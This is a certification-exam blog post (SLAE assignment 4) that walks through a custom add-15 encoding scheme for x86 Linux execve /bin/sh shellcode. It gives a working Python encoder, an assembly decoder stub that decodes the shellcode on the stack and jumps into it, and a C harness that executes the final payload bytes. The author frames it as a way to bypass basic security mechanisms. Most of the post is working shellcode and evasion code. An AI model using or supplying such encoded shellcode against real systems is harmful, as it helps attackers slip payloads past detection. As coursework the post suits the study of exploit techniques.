# Assignment 4 - Custom Encoder

It's a good day to be back in the lab. I'm stuck chugging some solid H20 today while taking a look at writing custom encoders for our shellcode. Today we'll look at the difference in encoding vs encrypting, and how to make a simple custom encoder to bypass basic security mechanisms.


## Problem Statement

* Create a custom encoding scheme like the "Insertion Encoder" shown to us
* Write PoC using execve-stack as the shellcode to encoe with your schema and execute

Let's get right into it.

## Encoding vs. Encrypting

Before we start I just want to make clear the differences between encoding something, and encrypting something. When you encode data, you transform it into another format using a scheme that is publicly available and that allows anyone to decode the information. With encryption, you modify data in such a way that only individuals with known values can reverse the transformation.

An example of encoding would be base64 encoding. Anyone can look up how to base64 decode something to access the originally encoded data. An example of encryption would be a rotational cipher, in which each character of a piece of data is rotated X number of times. This means that whoever is decrypting the data MUST know the value of X in order to retrieve the original data.

## Insertion Encoder

During the SLAE, an example was given called the insertion encoder. This encoder would take a set of hex data, and insert the value `0xAA` after each hex value in the given data. See the below transformation:

`0x12 0xAB 0xAC 0x01`

`0x12 0xAA 0xAB 0xAA 0xAC 0xAA 0x01 0xAA`

It's a pretty simple concept. And to get the original data back out, one would just traverse the data using 2 pointers, and moving the characters back to their original place!


## Custom Encoder

For this assignment we had to come up with a custom encoding scheme. I like the number 15, so I will publicly declare that the _CoffeNCoding_ scheme will take each data element and add the value of 15 to it in order to get an encoded version of the data.

You may be confused as to why this isn't exactly the same as the rotational cipher (which is an encryption algorithm) that I mentioned before. The main difference here is that I am publicly declaring this as an encoding scheme, in which everyone knows the value of which to add. If the value 15 was a secret, then this would be considered an encryption scheme.


#### Building an Encoder

We'll use python to build a quick encoder for our execve-stack shellcode.

**_CoffeeNcoder.py_**

```python
#!/usr/bin/python

# Python Coffee Encoder

COFFEE=15
COFFEE_HEX='0f'

# execve-stack /bin/sh
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""
stack = []
new_row = []
row = 0

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
    encoded += '\\x'
    encoded += '%02x' % (x+15)

    encoded2 += '0x'
    encoded2 += '%02x,' % (x+15)

    # Print these in sets of 4 so we can easily paste to push onto stack
    new_row.insert(0, '%02x' % (x+COFFEE))
    if len(new_row) == 4:
        stack.insert(0,new_row)
        new_row = []
        row += 1

if len(new_row):
    for i in range(0, 4-len(new_row)):
        new_row.insert(0, '%02x' % COFFEE)
    stack.insert(0, new_row)
    row += 1

# We need to pad the last row with null (coffee_hex) values
if not stack[0][0] == COFFEE_HEX:
    new_row = []
    for i in range(0, 4):
        new_row.insert(0, '%02x' % COFFEE)
    stack.insert(0, new_row)
    row += 1

print('{}\n'.format(encoded))

print('{}\n'.format(encoded2))

for i in range(0, row):
    print('0x{}'.format(''.join(stack[i])))

print '\nLen: %d' % len(bytearray(shellcode))
```

You'll notice that we pad our result with the `0x0F` value. This is so that our decoder will know when to stop decoding. When our decoder generates a value of 0 (`0x0F` - `0x0F`), it will know it has reached the end of the decoding process.

Giving it a test run, we see that our execve-stack shellcode transforms as follows:

`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`

`\x40\xcf\x5f\x77\x3e\x3e\x82\x77\x77\x3e\x71\x78\x7d\x98\xf2\x5f\x98\xf1\x62\x98\xf0\xbf\x1a\xdc\x8f`


#### Building the Decoder

Now that we have our encoded shellcode, we need to be able to decode it and pass execution to it. The basic algorithm for this will be to start at the beginning, and subtract 15 from each element until we hit a value that generates 0. Once this happens, pass the execution to the point where we started decoding. Let's see what that looks like in assembly.

**_assignment4.nasm_**

```asm
; Filename: assignment4.nasm
; Author:  Adam Brown
; Website:  https://coffeegist.com
;
;
; Purpose: Create a custom encoder/decoder for the SLAE exam

global _start

section .text
_start:

  ; Push shellcode onto stack in reverse order
  push 0x0f0f0f8f
  push 0xdc1abff0
  push 0x9862f198
  push 0x5ff2987d
  push 0x78713e77
  push 0x77823e3e
  push 0x775fcf40

  mov esi, esp ; Get address of first byte of shellcode
  mov eax, esi ; Save it

  jmp short decode ; Start decoding from first byte

decoder_loop:
  inc esi

decode:
  sub byte [esi], 0xf
  jnz short decoder_loop

  jmp eax  ; Jump to first byte of decoded shellcode
```


Here we see that we push our shellcode onto the stack, and then save a pointer to the top of the stack in eax. Now, we proceed to move through our shellcode, subtracting `0xF` until the zero flag is set. When this happens, we jump to eax, which is pointing to the first byte of our shellcode.


#### Execution

All that's left is to generate our full shellcode with the decoder stub, and throw it in our C program for a simulated code execution exploit.


**_shellcode.c_**

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x68\x8f\x0f\x0f\x0f\x68\xf0\xbf\x1a\xdc\x68\x98\xf1\x62\x98\x68\x7d\x98\xf2
\x5f\x68\x77\x3e\x71\x78\x68\x3e\x3e\x82\x77\x68\x40\xcf\x5f\x77\x89\xe6\x89
\xf0\xeb\x01\x46\x80\x2e\x0f\x75\xfa\xff\xe0";

void main() {
  printf("Shellcode Length:  %d\n", strlen(code));

  int (*ret)() = (int(*)())code;

  ret();
}
```

## Wrapping Up

This was a fairly simple assignment, but one that could be leveraged to beat certain systems in a pinch! This technique could be expounded on quite a bit, but I'll leave that as an exercise to you! Have fun, grind responsibly, and happy hacking!


###### SLAE Exam Statement

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-1158
